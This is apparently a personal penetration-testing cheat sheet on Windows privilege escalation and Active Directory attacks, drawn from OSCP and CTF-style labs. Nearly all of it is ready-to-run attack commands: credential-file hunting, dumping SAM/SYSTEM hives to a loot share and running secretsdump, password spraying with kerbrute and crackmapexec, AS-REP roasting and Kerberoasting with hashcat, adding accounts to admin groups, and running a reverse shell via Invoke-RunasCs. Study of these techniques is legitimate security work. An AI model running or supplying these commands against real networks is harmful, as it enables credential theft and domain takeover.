# Windows Privilege Escalation

I just found the craziest cheat code. Don't want to post it here till I know more but reach out.

### Initial Access

There are several key pieces of information we should always obtain:

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

```bash
hostname && whoami.exe && type proof.txt && ipconfig /all
```

```bash
> powershell -ep bypass
> whoami
> whoami /all
> net user
> net user steve
> Get-ChildItem Env: # Environment Variables
> $env:appkey
> $env:path
> cd env:appkey
> dir :env # Check for USERPROFILE
> cmd /c echo %PATH%
> powershell -command "Get-Clipboard"
> Tasklist /SVC #List processes running and services
> Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
> Get-LocalUser
> Get-LocalGroup # Look at the different groups on the current workstation. Members of Remote Desktop Users can access the system with RDP, while members of Remote Management Users can access it with WinRM.
> Get-LocalGroupMember adminteam
# While it is crucial to know which users are privileged, it is also vital for us to understand which users can use RDP. Obtaining the credentials for one of these users may lead us to a GUI access, which often tremendously improves our means of interacting with the system.
> systeminfo # Note what version of Windows, and whether it is a 32 or 64 bit system
# Our goal in this next step is to identify all network interfaces, routes, and active network connections. Based on this information, we may identify new services or even access to other networks. This information may not directly lead us to elevated privileges, but they are vital to understand the machine's purpose and to obtain vectors to other systems and networks.
> ipconfig /all # Note whether DHCP is enables, the IP address, the Default Gateway, the Physical Address, subnet mask, and the DNS Servers
> route print #  The output of this command is useful to determine possible attack vectors to other systems or networks.
> netstat -ano|select-string LIST # netstat -ano # To list all active network connections. Use -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection. Look for port 3389 to be in use, if it is, you're not the only user on the system (hint: use MimiKatz to extract credentials). 
# Check all installed applications. We can query two registry keys to list both 32-bit and 64-bit applications in the Windows Registry with the Get-ItemProperty Cmdlet. We pipe the output to select with the argument displayname to only display the application's names. We begin with the 32-bit applications and then display the 64-bit applications.
> netsh firewall show state
> netsh firewall show config
# Does the computer have an unexpected public ip, internal ip.. look into it
> arp -A # -a
> accesschk.exe -uwcqv "Authenticated Users" * # Weak permissions
> accesschk.exe -dqv "directory" # Expanded permissions
> accesschk.exe -uwdqs "Users" c:\ /accepteula # World writable folders/files
# How well patched is the system?
> wmic qfe get Caption,Description,HotFixID,InstalledOn
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # You should check whether the applications on the system have public exploits
> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
# However, the listed applications from above may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
> dir "C:\Program Files"
> dir "C:\Program Files (x86)"
> dir "C:\Users\lisa\Downloads"
> dir /q # Use this instead of plain dir to see who owns
# While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
> Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id, Path
> get-process -Id 3324 
> Get-Process NonStandardProcess | Select-Object Path
> Get-Process -Name notepad | Select-Object -ExpandProperty "Path"
> get-service \| ? {$_.DisplayName -like 'Druva*'}
# Get the path of the process
# Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,*.git,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*.bat,*.bak,*.conf,*.vbs,*.sql,*.reg,*password*,*sensitive*,*admin*,*login*,*secret*,*.vmdk,*cups*,*print*,*secret*,*cred*,*.ini,*oscp*,*ms01*,*pass*,*ms02*,*dc01*,SYSTEM,SAM,SECURITY,ntds.dit,id_rsa,authorized_keys -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
> Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\ -Include SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
# Find a string
> get-childitem -path C:\ -ErrorAction SilentlyContinue -include *.txt,*.pdf,*.xls,*.xlsx,*.vbs,*.sql,*.reg,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*.bat,*.bak,*.conf,*cups*,*print*,*secret*,*cred*,*oscp*,*ms01*,*pass*,*ms02*,*dc01*,*.ini -recurse | select-string -pattern *pass*,*ms01*,*ms02*,*user*,*svc*,*oscp*,username,admin,secret,cred*,key | select -unique path | format-table -hidetableheaders
# If you get access to the machine through another user, then restart the file search, as permissions may have changed
> Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
> Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
> Get-ChildItem -Path C:\Users -Include user.txt,root.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
> findstr /spin “password” *.* # find all files with the word "password" in them
> findstr /is "passwordss" *.txt *.config *.log *.xml *.docx *.xls
> takeown /f C:\backups\wwwroot\web.config # TAKE OWNERSHIP OF A FILE
> Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}} # CONFIRMING SUCCESS
> Get-History
> (Get-PSReadlineOption).HistorySavePath
> LOOK IN THE EVENT VIEWER FOR PASSWORDS # should go to Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational then search more . Apply filter for 4104 events , should appear in top 5
# We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
> setspn -L iis_service # or any server,client you discover
> net accounts # Obtain the account policy, lockout threshold
> mountvol # to list all drives that are currently mounted) (no mount points might be interesting have a look at it
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*cred*,*.ini,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
# MONEYYYYY
> netstat -p tcp
> netstat -p tcp -f
> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
> wevtutil qe Security /rd:true /f:text \| Select-String "/user" #	Searching security event logs
> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user" # Passing credentials to wevtutil
> Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} 
```

### PowerView.ps1

```bash
# This will allow you to run scripts
powershell -ep bypass
...
# Load PowerView (once it's already installed)
> . ./PowerView.ps1 # or Import-Module C:\\Tools\PowerView.ps1
# See the structure
> Get-NetDomain
# Get the domain controller IP, possibly end target
> Get-NetDomainController
# Important Policies
> Get-DomainPolicy
# Get password policy, important insights while cracking passwords 
> (Get-DomainPolicy)."system access"
# Information about the user you have access to, can be a lot of information
> Get-NetUser
# Only pull down the usernames
> Get-NetUser | select samaccountname # or select cn
> Get-ADUser -Identity YourUsername -Properties *
# See when the users last changed their passwords, if before policy change, may be weaker
> Get-UserProperty -Properties pwdlastset,logoncount
# See how many times each user has logged on, great way to identify honeypot accounts
> Get-UserProperty -Properties *
# See who can RDP
> Get-NetGroupMember "Remote Desktop Users"
# Enumerate the computer objects
> Get-NetComputer
# Get a ton of information about the computers
> Get-NetComputer -FullData # '| select {propertyName}' in order to nail down certain information, such as operating system
> Get-NetComputer | select operatingsystem,dnshostname # It's a good idea to grab this information early in the assessment to determine the relative age of the systems and to locate potentially weak targets.
# Map a computer to an IP address
> Resolve-IPAddress dev04.medtech.com
# Enumerate groups
> Get-NetGroup | select cn
# Get the groups of a user
> Get-NetGroup -Username "jeff"
# See who are admins
> Get-NetGroupMember -GroupName *admin* -Recurse
# Look through the different shares
> Invoke-ShareFinder
# Get the group policies, important one
> Get-NetGPO
# Narrowing down the above
> Get-NetGPO | select displayname, whenchanged
# Find out if you have admin privileges on any computers in the domain
> Find-LocalAdminAccess # May take a few minutes
# See who's logged in & other info
> Get-NetSession -ComputerName web04 -Verbose # Untrustable on Windows 11
# This is more reliable, look for admins to be logged on machines, either to collect their NTLM hash or to impersonate commands running as him
> .\PsLoggedOn.exe \\file04
# Another way to get logged on users, needs local admins rights
> Get-NetLoggedOn -ComputerName <servername>
# We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan
> Get-NetUser -SPN | select samaccountname,serviceprincipalname
# See if we can perform an AS-REP Roast on any users
> Get-NetUser -PreauthNotRequired
# Get Kerberoastable Users
> Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
# Attempt to resolve SPN's IP
> nslookup.exe web04.corp.com # Typically located in C:\Tools\
# Enumerate ACEs, filtering on an identity
> Get-ObjectAcl -Identity stephanie # Look for AD Rights, SIDs. SID has AD Rights to SID
> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
# Convert SIDs to domain object name
> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
# Clean output, look for all users with General All Rights for either a user or group object, can change permissions and change their passwords if user
# DO THIS RECURSIVELYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
> Get-ObjectAcl -Identity "Backup Operators" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights # Can also do this for GenericWrite,WriteOwner,WriteDACL,AllExtendedRights,ForceChangePassword,Self (Self-Membership)
# Easier way to do the above
> Find-InterestingDomainAcl # If you are GenericAll or Write privs, then you should simply add yourself to the group and inherit the rights associated 'net group "group_name" jimothy /add /domain', then rinse and repeat. Elevate your privileges as much as possible
# Convert multiple SIDs to readable objects at once
> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName # If a regular user has these rights, this is likely a misconfiguration.. and should be prioritized
# Find shares in the domain
> Find-DomainShare # -CheckShareAccess to only display shares available to us
> ls \\dc1.corp.com\sysvol\corp.com\
> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
> Get-ADUser -Identity Christopher.Lewis -Properties *
> Get-DomainGroup -Identity "developers" -Properties * -Recurse -credential $cred
> $SecPassword = ConvertTo-SecureString 'Nagoya2023' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('NAGOYA-IND\Christopher.Lewis', $SecPassword);
> Get-DomainUser -Credential $Cred
> Get-DomainGroup -Credential $Cred
> get-domaingroup | Get-DomainGroupMember -Recurse
> Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
> Get-DomainObjectAcl "dc=nagoya-industries,dc=com" -ResolveGUIDs -Cred $Cred | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
> Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```

```bash
Find-InterestingDomainShareFile -Include *passwords*
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingFile 
```

### PowerSploit

```bash
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
Find-ProcessDLLHijack
Find-PathDLLHijack # Write-HijackDll
```

```cmd
# With WMIC
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
# Writable Path (accesschk.exe > upnphost)
# Accesschk for any writable path
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\ /accepteula
accesschk.exe -wuvc daclsvc /accepteula
accesschk.exe /accepteula "harey" -kvuqsw hklm\System\CurrentControlSet\services # Checking for weak service ACLs in the Registry
```

### Time-Based File SearchPowerShell Scripts -> RUN Amorous.ps1 INSTEAD, MUCH BETTER (but time consuming)

Last 1,000 Modified System Files.

```bash
Get-ChildItem -Path "C:\Windows" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime | Export-Csv -Path "C:\Windows\Tasks\ModifiedSystemFiles.csv"
```

Last 1,000 Modified Configuration Files.

```bash
Get-ChildItem -Path "C:" -Include *.config,*.ini,*.xml -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime | Export-Csv -Path "C:\Windows\Tasks\ModifiedSystemFiles.csv" -NoTypeInformation
```

Last 1,000 Modified Files in User Profiles.

```bash
Get-ChildItem -Path "C:\Users" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
```

Filter by Date Range: If you're interested in files modified within a specific time frame (e.g., the last 7 days):

```bash
Get-ChildItem -Path "C:" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -ge (Get-Date).AddDays(-7)} | Sort-Object LastWriteTime -Descending | Select-Object FullName, LastWriteTime | Export-Csv -Path "C:\Windows\Tasks\
```

### SharpHound.ps1 && BloodHound.ps1

PLEASE USE ../other/CUSTOMQUERIES.JSON IN $HOME/.config/bloodhound/customqueries.json !!!!!!

Note that SharpHound supports looping, running cyclical queries over time like a cron job, which will gather additional data such as environment changes, new log-ons.

```bash
> . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
> Get-Help Invoke-BloodHound
> Invoke-BloodHound -CollectionMethod All,GPOLocalGroup $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "molly" # May take a couple minutes
> Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "local"
# Or remotely
> bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
> python bloodhound.py --dns-tcp -d $dom -u enox -p california -c all -ns $ip
> proxychains bloodhound-python -c ALL -u kevin -p 'Passw0rd' -d red.com -dc dc.red.com -ns 10.9.20.10 --dns-tcp
> proxychains bloodhound-python3 -c ALL -u 'WEB05$@RED.COM' --hashes 00000000000000000000000000000000:d66f37fd3d677522959e5b4aeecafb78 -d COMPLYEDGE.COM  -ns 172.16.76.168 --dns-tcp (Extract NTLM from /etc/krb5cc.keytab)
```

```bash
kali@kali:~$ sudo neo4j start
# Go to http://localhost:7474 and login with default credentials
kali@kali:~$ bloodhound
```

Match for all computers and users in the domain:

```bash
MATCH (m:Computer) RETURN m # All computers
MATCH (m:User) RETURN m # All users
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p # Sessions
# Find All edges any owned user has on a computer
MATCH p=shortestPath((m:User)-[r]->(b:Computer)) WHERE m.owned RETURN p
# Find users that logged in within the last 90 days
MATCH (u:User) WHERE u.lastlogon < (datetime().epochseconds - (90 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] RETURN u
# Find users with passwords last set thin the last 90 days
MATCH (u:User) WHERE u.pwdlastset < (datetime().epochseconds - (90 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u
# Find any users that have a session
MATCH p=(m:Computer)-[r:HasSession]->(n:User {domain: "OSCP.EXAM"}) RETURN p
# View all GPOs
Match (n:GPO) return n
# Return all groups that have an admin in them
MATCH (n:Group {admincount:true}) RETURN n
# Return all high value groups, MAKE SURE YOU CONFIRM NESTED GROUPS ON YOUR OWN
match (m:Group {highvalue:true}) RETURN m
# Shortest paths to Domain Admins group from computers:
MATCH (n:Computer),(m:Group {name:'DOMAIN ADMINS@OSCP.EXAM'}),p=shortestPath((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct*1..]->(m)) RETURN p
# Excluding routes from DC
WITH '(?i)ldap/.*' as regex_one WITH '(?i)gc/.*' as regex_two MATCH (n:Computer) WHERE NOT ANY(item IN n.serviceprincipalnames WHERE item =~ regex_two OR item =~ regex_two ) MATCH(m:Group {name:"DOMAIN ADMINS@OSCP.EXAM"}),p=shortestPath((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct*1..]->(m)) RETURN p
# Show routes Domain Users to groups that have an admin
MATCH (g:Group) WHERE g.name =~ 'DOMAIN USERS@.*' MATCH (g1:Group) WHERE g1.admincount =true OPTIONAL MATCH p=shortestPath((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p
# Show routes from groups with no admins to ones that do
MATCH (g:Group) WHERE g.admincount=false MATCH (g1:Group) WHERE g1.admincount=true OPTIONAL MATCH p=shortestPath((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p
```

Remember to mark the computers that you own!!!!!

It's a good idea to mark every object we have access to as owned to improve our visibility into more potential attack vectors. There may be a short path to our goals that hinges on ownership of a particular object.

#### Who is logged on?

Use PsLoggedon.exe if it's an older machine, such as Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2). Don't trust it if it says that nobody is logged on, but trust it if it says there is somebody.

```bash
.\PsLoggedOn.exe \\file04
```

#### InvokeRunasCs.ps1

If you have credentials for another user on a system, but cannot seem to login as them through any of the traditional methods, use the:

```bash
. .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 "cmd /c c:\windows\tasks\svc_mssql.exe" --bypass-uac
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>"
```

and execute a reverse shell to get onto the system as them.

#### winexe & pth-winexe

If runas doesn't seem to be working, this is an alternative.

```bash
winexe -U jenkins/administrator //$ip cmd.exe
pth-winexe -U jenkins/administrator //$ip cmd.exe
# pth-wmic & pth-wmis
```

#### Look out for SeManageVolumePrivilege

If you have the SeManageVolumePrivilege, then you may be able to abuse it to get root. Don't forget that you have ONE shot, so don't mess it up.

There are some great examples in Offsec's Access PG Practice write-ups and "https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9--------------------------------". 

#### Additional Directory Information

Simple way to get more information about files in directory, such as who owns them:

```bash
dir /a /o /q
```

#### Investigate Process

```bash
get-nettcpconnection | select local*,remote*,state,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}
Get-NetTCPConnection | Where-Object { $_.State -eq "LISTEN" } | select @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName)}, 127.0.0.1, 8000
Get-Process -Id (Get-NetTCPConnection -LocalPort 8000).OwningProcess
Get-Process -Id (Get-NetUDPEndpoint -LocalPort 8000).OwningProcess
netstat -a -b
```

Check What Process is Running on a Port.

```bash
Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
```

#### Interesting Object Permissions

AD includes a wealth of permission types that can be used to configure an ACE. However, from an attacker's standpoint, we are mainly interested in a few key permission types. Here's a list of the most interesting ones along with a description of the permissions they provide:

	GenericAll: Full permissions on object
	GenericWrite: Edit certain attributes on the object
	WriteOwner: Change ownership of the object
	WriteDACL: Edit ACE's applied to object
	AllExtendedRights: Change password, reset password, etc.
	ForceChangePassword: Password change for object
	Self (Self-Membership): Add ourselves to for example a group

Example abuse:

```bash
net group "Administrators" stephanie /add /domain
```

#### enum4linux

"As soon as you see that SMB is open, run enum4linux." It will try to enumerate SMB as much as it can.
```
enum4linux -A 123.123.123.123 -u user -p password # user and password are optional
```

#### smbclient

For enumerating SMB shares. I believe that you can also do it without credentials by putting an empty username and then maybe also an empty password, though maybe just the empty username. I may be getting this confused with cme smb. 

```bash
smbclient -L 123.123.123.123 -U domainname/username

# I believe that you can also do it without credentials by putting an empty username and then maybe also an empty password, though maybe just the empty username. I may be getting this confused with cme smb. 
cme smb -L -U '' 123.123.123.123
```

#### runas

Use this command to run as another user (if you have their credentials): 

```bash
>  runas /user:domainname\\username cmd.exe
> cmd.exe /c echo REGGIE1234ronnie | runas /u:sequel\\ryan.cooper whoami
```

Without access to a GUI we cannot use Runas since the password prompt doesn't accept our input in commonly used shells, such as our bind shell or WinRM. 

However, we can use a few other methods to access the system as another user when certain requirements are met. We can use WinRM or RDP to access the system if the user is a member of the corresponding groups. Alternatively, if the target user has the Log on as a batch job6 access right, we can schedule a task to execute a program of our choice as this user. Furthermore, if the target user has an active session, we can use PsExec from Sysinternals.

Since we have access to a GUI, let's use Runas in PowerShell to start cmd as user backupadmin. We'll enter the username as argument for /user: and the command we want to execute. Once we execute the command, a password prompt appears in which we'll enter the previously found password.

```bash
PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
PS C:\Users\steve> 
```

Once the password is entered, a new command line window appears. The title of the new window states running as CLIENTWK220\backupadmin.

Use whoami to confirm the command line is working and we are indeed backupadmin.

#### Windows' Grep (With Context)

```bash
> schtasks /query /fo LIST | Select-String -Pattern 12 -Context 4,4
> Get-Content file.txt | Select-String -Pattern OS -Context 2,4
```

#### schtasks

Allows you to see the scheduled tasks on your local box (once you have a shell/ssh session). The following is command useful as it will essentially answer the quesion, if we can exploit this, what kind of priviledges will we gain?

```bash
schtasks /query
...
schtasks /query /fo LIST /v > schtasks.txt  
schtasks /query /fo LIST /v /TN "FTP Backup"
```

#### Recursively Search Through Directories (May only be in CMD)

```bash
dir /s /b file.txt
cmd /c "dir /s /b"
```

#### Recursively Search a User's Workstation

```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

#### SAM and SYSTEM Files

Always check the SAM if there's any sort of backup or loose permissions in SMB. If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystem:
They are typically located in "C:\Windows\System32\config".

```bash
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

reg save hklm\security c:\security
reg save hklm\sam c:\sam
reg save hklm\system c:\system

copy C:\sam z:\loot
copy c:\security z:\loot
c:\system z:\loot

*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM


TRY IT WITHOUT PUTTING THE PASSWORD IN THE PROMPT

impacket-secretsdump -sam SAM -system SYSTEM LOCAL
/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
impacket-secretsdump Admin:'password'@$ip -outputfile hashes
impacket-secretsdump Admin:@$ip -outputfile hashes

samdump2 SYSTEM SAM
*disabled* Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# creddump7 - Python tool to extract credentials and secrets from Windows registry hives
/usr/share/creddump7
├── cachedump.py
├── framework
├── lsadump.py
├── pwdump.py
└── __pycache_

./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

evil-winrm -i $dc -u $user -H $hash
```

This will provide hashes that you will be able to crack.

#### Windows Password Spraying

```bash
 __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

PS C:\Tools> type .\usernames.txt
# Validate Usernames
PS C:\Tools> .\kerbrute_windows_amd64.exe userenum -d corp.com --dc=dc1.corp.com usernames.txt
# Password Spraying
PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

# If NTLM is enabled, you can use crackmapexec
kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

```bash
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

#### AS-REP Roasting

Must have "Do not require Kerberos preauthentication" enabled. Will provide AS-REP hash with session key and TGT, which you can try to crack with HashCat or crackstation.net.

```bash
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

We can also perform AS-REP Roasting on Windows using Rubeus. Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except asreproast. Rubeus will automatically identify vulnerable user accounts. We also add the flag /nowrap to prevent new lines being added to the resulting AS-REP hashes.

```bash
PS C:\Tools> .\Rubeus.exe asreproast /nowrap
```

If no users have the "Do not require Kerberos preauthentication" enabled, but you have GenericWrite or GenericAll on another AD user account, you could reset their password (which would lock them out), or better yet change UAC permissions to enable "Do not require Kerberos preauthentication".

#### Kerberoasting

If we know the SPN  we want to target, we can request a service ticket for it from the domain controller. The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account.

We'll provide hashes.kerberoast as an argument for /outfile to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.

```bash
# Sync the time
net time \\dc01.corp.local /set
Get-NetAdapter ethernet0* | Set-DnsClientServerAddress -ServerAddress @('192.168.45.213')
# Method from Windows
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Method from Linux
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
# If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Manual version in case Rubeus doesn't work, "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting".

Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. 

#### Silver Tickets

In general, you need to collect the following three pieces of informaiton to create a silver ticket:
	1. SPN password hash
	2. Domain SID
	3. Target SPN

